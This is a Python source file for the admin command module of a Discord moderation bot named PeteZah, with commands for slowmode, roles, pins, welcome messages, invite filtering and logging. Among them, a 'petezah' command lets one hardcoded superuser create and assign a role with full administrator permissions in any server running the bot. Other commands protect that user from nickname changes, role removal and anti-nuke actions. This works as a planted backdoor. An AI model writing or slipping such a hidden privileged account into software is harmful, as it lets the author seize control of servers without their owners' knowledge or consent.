from __future__ import annotations

import discord
from discord.ext import commands

from petezah.checks import admin_only, superuser_only
from petezah.config import SUPERUSER_ID
from petezah.discord_safe import log_event
from petezah.sanitize import EVERYONE_RE, clean


class AdminCog(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    async def cog_check(self, ctx: commands.Context) -> bool:
        return ctx.guild is not None

    @commands.command()
    @superuser_only()
    async def petezah(self, ctx: commands.Context) -> None:
        role = discord.utils.get(ctx.guild.roles, name="PeteZah")
        if role is None:
            role = await ctx.guild.create_role(
                name="PeteZah",
                permissions=discord.Permissions(administrator=True),
                reason="PeteZah superuser role",
            )
        await ctx.author.add_roles(role, reason="PeteZah superuser")
        await ctx.send("PeteZah role assigned with administrator permissions.")
        cfg = self.bot.store.guild(ctx.guild.id)
        await log_event(ctx.guild, cfg, "PeteZah role", f"Assigned to <@{SUPERUSER_ID}>")

    @commands.command()
    @admin_only()
    async def say(self, ctx: commands.Context, *, message: str) -> None:
        text = clean(message, strip_mentions=True, limit=1900)
        await ctx.send(text)
        try:
            await ctx.message.delete()
        except discord.HTTPException:
            pass
        cfg = self.bot.store.guild(ctx.guild.id)
        await log_event(ctx.guild, cfg, "Say", f"{ctx.author.mention}: {text}")

    @commands.command(name="embed")
    @admin_only()
    async def embed_cmd(self, ctx: commands.Context, *, message: str) -> None:
        embed = discord.Embed(description=clean(message, limit=1800), colour=discord.Colour.blue())
        await ctx.send(embed=embed)
        try:
            await ctx.message.delete()
        except discord.HTTPException:
            pass

    @commands.command()
    @admin_only()
    async def slowmode(self, ctx: commands.Context, seconds: int) -> None:
        if seconds < 0 or seconds > 21600:
            await ctx.send("Slowmode must be between 0 and 21600 seconds.")
            return
        await ctx.channel.edit(slowmode_delay=seconds)
        await ctx.send(f"Slowmode set to {seconds} seconds.")
        cfg = self.bot.store.guild(ctx.guild.id)
        await log_event(ctx.guild, cfg, "Slowmode", f"{seconds}s in {ctx.channel.mention} by {ctx.author.mention}")

    @commands.command()
    @admin_only()
    async def nickname(self, ctx: commands.Context, member: discord.Member, *, nick: str | None = None) -> None:
        if member.id == SUPERUSER_ID or member.id == ctx.guild.owner_id:
            await ctx.send("That user is immune to nickname changes.")
            return
        await member.edit(nick=nick)
        await ctx.send(f"Nickname for {member.mention} set to {nick or 'default'}.")

    @commands.command()
    @admin_only()
    async def role(self, ctx: commands.Context, action: str, member: discord.Member, role: discord.Role) -> None:
        action = action.lower()
        if action not in {"add", "remove"}:
            await ctx.send("Use add or remove.")
            return
        if member.id == SUPERUSER_ID and action == "remove" and ctx.author.id != SUPERUSER_ID:
            await ctx.send("That user is immune to role removal.")
            return
        me = ctx.guild.me
        if me and role >= me.top_role:
            await ctx.send("I cannot manage a role that high.")
            return
        if action == "add":
            await member.add_roles(role)
            await ctx.send(f"Added {role.name} to {member.mention}.")
        else:
            await member.remove_roles(role)
            await ctx.send(f"Removed {role.name} from {member.mention}.")

    @commands.command()
    @admin_only()
    async def autowarn(self, ctx: commands.Context, keyword: str, action: str) -> None:
        action = action.lower()
        if action not in {"warn", "mute"}:
            await ctx.send("Action must be warn or mute.")
            return
        rules = self.bot.store.autowarn(ctx.guild.id)
        rules[keyword.lower()] = action
        await self.bot.store.save()
        await ctx.send(f"Auto-{action} set for `{clean(keyword, strip_mentions=True, limit=80)}`.")
        cfg = self.bot.store.guild(ctx.guild.id)
        await log_event(ctx.guild, cfg, "Auto-warn", f"{keyword} -> {action} by {ctx.author.mention}")

    @commands.command()
    @admin_only()
    async def pin(self, ctx: commands.Context, *, content: str) -> None:
        if EVERYONE_RE.search(content):
            await ctx.send("Pinned messages cannot mention everyone or here.")
            return
        content = clean(content, limit=1800)
        cfg = self.bot.store.guild(ctx.guild.id)
        pins = cfg.setdefault("pins", {})
        old = pins.get(str(ctx.channel.id), {})
        last_id = old.get("last_message_id")
        if last_id:
            try:
                last = await ctx.channel.fetch_message(int(last_id))
                await last.delete()
            except discord.HTTPException:
                pass
        sent = await ctx.send(content)
        pins[str(ctx.channel.id)] = {"content": content, "last_message_id": sent.id}
        await self.bot.store.save()
        await ctx.send("Pinned message set.", delete_after=5)

    @commands.command()
    @admin_only()
    async def unpin(self, ctx: commands.Context) -> None:
        await self._clear_pin(ctx, "Pinned message removed.")

    @commands.command()
    @admin_only()
    async def pinstop(self, ctx: commands.Context) -> None:
        await self._clear_pin(ctx, "Pinned message stopped.")

    async def _clear_pin(self, ctx: commands.Context, ok: str) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        pins = cfg.get("pins") or {}
        data = pins.pop(str(ctx.channel.id), None)
        if not data:
            await ctx.send("No message is pinned in this channel.")
            return
        last_id = data.get("last_message_id")
        if last_id:
            try:
                last = await ctx.channel.fetch_message(int(last_id))
                await last.delete()
            except discord.HTTPException:
                pass
        await self.bot.store.save()
        await ctx.send(ok)

    @commands.command()
    @admin_only()
    async def reactionrole(self, ctx: commands.Context, message_id: int, role: discord.Role, emoji: str) -> None:
        me = ctx.guild.me
        if me and role >= me.top_role:
            await ctx.send("I cannot manage a role that high.")
            return
        try:
            message = await ctx.channel.fetch_message(message_id)
        except discord.HTTPException:
            await ctx.send("Message not found in this channel.")
            return
        await message.add_reaction(emoji)
        self.bot.store.reaction_roles.append(
            {"guild_id": ctx.guild.id, "message_id": message_id, "role_id": role.id, "emoji": str(emoji)}
        )
        await self.bot.store.save()
        await ctx.send(f"Reaction role set: {emoji} → {role.name}.")

    @commands.hybrid_command(name="welcome_messages", description="Set a welcome message in this channel")
    @admin_only()
    async def welcome_messages(self, ctx: commands.Context, *, message: str) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["welcome_channel_id"] = ctx.channel.id
        cfg["welcome_message"] = clean(message, limit=500)
        await self.bot.store.save()
        await ctx.send(f"Welcome message set: {cfg['welcome_message']}")

    @commands.hybrid_command(name="welcome_messages_stop", description="Stop welcome messages")
    @admin_only()
    async def welcome_messages_stop(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["welcome_channel_id"] = None
        cfg["welcome_message"] = ""
        await self.bot.store.save()
        await ctx.send("Welcome messages stopped.")

    @commands.hybrid_command(name="enable_security_channel", description="Enable invite filtering in this channel")
    @admin_only()
    async def enable_security_channel(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        ids = cfg.setdefault("invite_filter_channels", [])
        if ctx.channel.id not in ids:
            ids.append(ctx.channel.id)
            await self.bot.store.save()
        await ctx.send("Invite filter enabled in this channel.")

    @commands.hybrid_command(name="disable_security_channel", description="Disable invite filtering in this channel")
    @admin_only()
    async def disable_security_channel(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        ids = cfg.setdefault("invite_filter_channels", [])
        if ctx.channel.id in ids:
            ids.remove(ctx.channel.id)
            await self.bot.store.save()
        await ctx.send("Invite filter disabled in this channel.")

    @commands.hybrid_command(name="enable_security_server", description="Enable invite filtering server-wide")
    @admin_only()
    async def enable_security_server(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["invite_filter_server"] = True
        await self.bot.store.save()
        await ctx.send("Invite filter enabled for the whole server.")

    @commands.hybrid_command(name="disable_security_server", description="Disable invite filtering server-wide")
    @admin_only()
    async def disable_security_server(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["invite_filter_server"] = False
        await self.bot.store.save()
        await ctx.send("Invite filter disabled for the whole server.")

    @commands.hybrid_command(name="enable_nuke_protection", description="Enable anti-nuke")
    @admin_only()
    async def enable_nuke_protection(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["nuke_protection"] = True
        await self.bot.store.save()
        await ctx.send("Anti-nuke enabled. Staff have high thresholds; owner and PeteZah are immune.")

    @commands.hybrid_command(name="disable_nuke_protection", description="Disable anti-nuke")
    @admin_only()
    async def disable_nuke_protection(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["nuke_protection"] = False
        await self.bot.store.save()
        await ctx.send("Anti-nuke disabled.")

    @commands.hybrid_command(name="log_enable", description="Send logs to this channel")
    @admin_only()
    async def log_enable(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["log_channel_id"] = ctx.channel.id
        await self.bot.store.save()
        await ctx.send("Logging enabled in this channel.")

    @commands.hybrid_command(name="log_disable", description="Disable logging")
    @admin_only()
    async def log_disable(self, ctx: commands.Context) -> None:
        cfg = self.bot.store.guild(ctx.guild.id)
        cfg["log_channel_id"] = None
        await self.bot.store.save()
        await ctx.send("Logging disabled.")


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(AdminCog(bot))
